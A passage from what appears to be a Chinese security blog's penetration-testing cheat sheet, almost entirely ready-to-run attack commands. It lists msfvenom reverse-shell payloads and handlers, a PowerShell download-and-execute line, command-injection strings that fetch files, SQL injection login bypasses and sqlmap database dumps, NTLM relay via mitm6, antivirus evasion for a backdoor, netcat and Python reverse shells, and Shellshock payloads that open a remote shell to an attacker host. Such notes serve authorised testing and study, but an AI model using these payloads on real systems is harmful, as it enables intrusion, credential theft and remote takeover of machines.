java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war<br></code></pre></td></tr></table></figure><h3 id="脚本-payloads">脚本 payloads</h3><p>Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py<br></code></pre></td></tr></table></figure><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh<br></code></pre></td></tr></table></figure><p>Perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl<br></code></pre></td></tr></table></figure><h3 id="shellcode">shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f<br></code></pre></td></tr></table></figure><h3 id="Handlers">Handlers</h3><p>msf常用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/multi/handler<br><br><span class="hljs-built_in">set</span> PAYLOAD<br><br><span class="hljs-built_in">set</span> LHOST<br><br><span class="hljs-built_in">set</span> LPORT<br><br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br><br>exploit -j -z<br></code></pre></td></tr></table></figure><p><strong>Demo</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f &gt; exploit.extension<br></code></pre></td></tr></table></figure><h2 id="center-Powershell-center"><center>Powershell</center></h2><p>执行旁路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Set-ExecutionPolicy Unrestricted<br>./file.ps1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module script.psm1<br>Invoke-FunctionThatIsIntheModule<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)<br></code></pre></td></tr></table></figure><p>Powershell.exe被阻止</p><p>Use ‘not powershell’ <a target="_blank" rel="noopener" href="https://github.com/Ben0xA/nps">https://github.com/Ben0xA/nps</a></p><h2 id="center-提权-center"><center>提权</center></h2><h3 id="Linux-2">Linux</h3><p><a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></p><h3 id="Windows-2">Windows</h3><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></p><p><a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p><p><a target="_blank" rel="noopener" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></p><h2 id="center-命令行注入-center"><center>命令行注入</center></h2><h3 id="遍历文件">遍历文件</h3><p><code>website.com/file.php[?path=/]</code></p><h3 id="使用curl探测HTTP-options">使用curl探测HTTP options</h3><p><code>curl -vX OPTIONS [website]</code></p><h3 id="使用CURL将文件上传到具有PUT方法的网站">使用CURL将文件上传到具有PUT方法的网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0<br></code></pre></td></tr></table></figure><h3 id="传输文件">传输文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?path=/;wget http://IPADDRESS:8000/FILENAME.EXTENTION;<br></code></pre></td></tr></table></figure><h3 id="连接shell">连接shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;php -f filelocation.php<br></code></pre></td></tr></table></figure><h2 id="center-SQL注入-center"><center>SQL注入</center></h2><h3 id="注入">注入</h3><p>登录表单的常见注入:</p><ul><li>admin’ –</li><li>admin’ #</li><li>admin’/*</li><li>’ or 1=1–</li><li>’ or 1=1#</li><li>’ or 1=1/*</li><li>') or ‘1’='1–</li><li>') or (‘1’='1—</li></ul><h3 id="SQLMap">SQLMap</h3><p>自动sqlmap扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://demo.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3<br></code></pre></td></tr></table></figure><p>有针对性的sqlmap扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=<span class="hljs-string">&quot;/var/www/blah.php&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://meh.com/meh.php?id=1&quot;</span> --dbms=mysql --tech=U --random-agent --dump Scan url <span class="hljs-keyword">for</span> union + error based injection with mysql backend and use a random user agent + database dump<br></code></pre></td></tr></table></figure><p>sqlmap检查表单注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">&quot;http://meh.com/form/&quot;</span> –forms<br></code></pre></td></tr></table></figure><p>dump数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">&quot;http://meh/vuln-form&quot;</span> --forms -D database-name -T <span class="hljs-built_in">users</span> –dump<br></code></pre></td></tr></table></figure><p>刷新会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --flush session<br></code></pre></td></tr></table></figure><p>尝试使用布尔技术来利用“用户”字段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -p user --technique=B<br></code></pre></td></tr></table></figure><p>Post</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r demo.txt<br></code></pre></td></tr></table></figure><h2 id="其他">其他</h2><p><a target="_blank" rel="noopener" href="http://xn--mitm6NTLMRelayx-2e8x1697beef.py">使用mitm6的NTLMRelayx.py</a></p><p>使用mitm6通过IPv6欺骗获取捕获的凭据，并通过ntlmrelayx.py将其转发到目标。它需要安装ntlmrelayx.py和mitm6。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitm6 -d &lt;domain.local&gt;<br><br>ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/<br></code></pre></td></tr></table></figure><h3 id="隧道">隧道</h3><p>sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以下命令的作用是通过10.0.0.1隧道传输流量，并为通过sshuttle隧道发往10.10.10.0/24的所有流量建立路由。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sshuttle -r root@10.0.0.1 10.10.10.0/24<br></code></pre></td></tr></table></figure><h3 id="AV-Bypass">AV Bypass</h3><p>需要安装wine和hyperion。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe<br></code></pre></td></tr></table></figure><h3 id="Web主机（传输文件">Web主机（传输文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m SimpleHTTPServer 80<br></code></pre></td></tr></table></figure><h3 id="PHP-msf-shell">PHP msf shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 R &gt; phpmeterpreter.php<br></code></pre></td></tr></table></figure><h3 id="Netcat-2">Netcat</h3><p>监听</p><p>nc -lvp<port></port></p><p>反弹</p><p>nc -e /bin/bash ip port</p><p>ncat -v -l -p 7777 -e /bin/bash</p><p>通过ncat下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> happy.txt | ncat -v -l -p 5555 <br>ncat localhost 5555 &gt; happy_copy.txt <br></code></pre></td></tr></table></figure><h3 id="使用解释器反弹shell">使用解释器反弹shell</h3><p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p><p>Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;127.0.0.1&#x27;,9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Shellshock">Shellshock</h3><p>CURL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x TARGETADDRESS -H <span class="hljs-string">&quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/HOSTIP/1234 0&gt;&amp;1&quot;</span> TARGETADDRESS/cgi-bin/status<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x 192.168.28.167:PORT -H <span class="hljs-string">&quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.28.169/1234 0&gt;&amp;1&quot;</span> 192.168.28.167/cgi-bin/status<br></code></pre></td></tr></table></figure><p>SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IPADDRESS <span class="hljs-string">&#x27;() &#123; :;&#125;; /bin/bash&#x27;</span><br></code></pre></td></tr></table></figure></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%9D%82%E9%A1%B9/" class="category-chain-item">杂项</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" class="print-no-link">#备忘录</a></div></div><div class="license-box my-3"><div class="license-title"><div>小本本--备忘录</div><div>https://guosec.online/posts/554d428f.html</div></div><div class="license-meta"><div class="license-meta-item license-meta-date"><div>Posted on</div><div>February 9, 2019</div></div><div class="license-meta-item license-meta-date"><div>Updated on</div><div>July 2, 2022</div></div><div class="license-meta-item"><div>Licensed under</div><div>本博客所有文章除特别声明外，均采用 <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-by"></i> </span></a><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/"><span class="hint--top hint--rounded" aria-label="SA - Share-alike"><i class="iconfont icon-sa"></i> </span></a>&nbsp;协议，转载请注明出处！</div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/posts/1de3639b.html" title="Jboss反序列化漏洞(CVE-2017-12149)"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">Jboss反序列化漏洞(CVE-2017-12149)</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/posts/8e5dfaea.html" title="HackTehBox-SecNotes"><span class="hidden-mobile">HackTehBox-SecNotes</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><i class="iconfont">Copyright </i><i class="iconfont icon-copyright"></i> <i class="iconfont">2022 InfoSec</i></div><div class="beian"><span><a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">京ICP证1236666号 </a></span><span><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678" rel="nofollow noopener" class="beian-police" target="_blank"><span style="visibility:hidden;width:0">|</span> <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"> <span>京公网安备125364257号</span></a></span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>